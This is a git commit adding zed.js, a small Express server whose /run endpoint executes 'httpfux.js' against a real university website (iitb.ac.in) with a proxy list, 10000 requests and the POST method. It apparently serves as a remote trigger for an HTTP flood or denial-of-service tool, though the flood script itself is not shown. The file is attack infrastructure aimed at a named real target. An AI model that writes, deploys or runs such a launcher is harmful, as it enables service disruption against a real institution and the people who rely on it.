8e05a68d7fef4db7c7fae2f75b2f8a2ac131c6dd
baphomet-disciple <122203558+baphomet-disciple@users.noreply.github.com>
2023-02-11 19:15:00 +0530

    Add files via upload

---
+++ zed.js
@@ -0,0 +1,20 @@
+const express = require('express');
+const { exec } = require('child_process');
+const app = express();
+
+app.get('/run', (req, res) => {
+  exec(
+    'node httpfux.js https://www.iitb.ac.in/ proxies.txt 10000 POST',
+    (error, stdout, stderr) => {
+      if (error) {
+        res.status(500).send(error);
+      } else {
+        res.send(stdout);
+      }
+    }
+  );
+});
+
+app.listen(3001, () => {
+  console.log('API server running on port 3001');
+});
